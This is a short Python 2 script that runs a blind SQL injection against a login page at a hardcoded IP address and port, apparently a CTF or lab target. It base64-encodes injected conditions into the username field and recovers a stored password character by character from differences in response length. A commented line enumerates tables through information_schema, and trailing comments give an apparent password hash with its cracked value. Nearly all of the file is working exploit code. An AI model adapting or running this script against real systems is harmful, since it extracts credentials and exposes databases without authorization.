'''
Created on 2016-2-22

@author: wenhuizone
'''
import base64
import time
import string
import sys
import random
import urllib
import requests

payloads = list('abcdefghijklmnopqrstuvwxyz0123456789@_.')

print 'start to retrive MySQL info:'

user = ''

for i in range(1,33):
    for payload in payloads:

        #test = "ascii(mid((selEct group_concat(table_name) from information_schema.tables where table_schema=0x6c737573657273),%s,1))=%s"  % (i, ord(payload))
        test = "ascii(mid((selEct password from user limit 0,1),%s,1))=%s"  % (i, ord(payload))
        s1 = "test\'  and " + test +" and \'1"
 
        s1 = base64.b64encode(s1)
        s2 = base64.b64encode('test')

        url = 'http://140.113.194.85:49165/loginsystem/login.php'
        p  = {'username':s1,'password':s2}
 
        r = requests.post(url,data=p )
        
        length = len(r.text)
  
        if(length == 461):
            user += payload
            sys.stdout.write('\r\n[In progress] %s' % user)
            sys.stdout.flush()
            break
        else:
            sys.stdout.write('.')

 

print '\n[Done]MySQL info is', user

#7e29dc29465ffcd2956dc7b542b73f21
#gogopowerranger
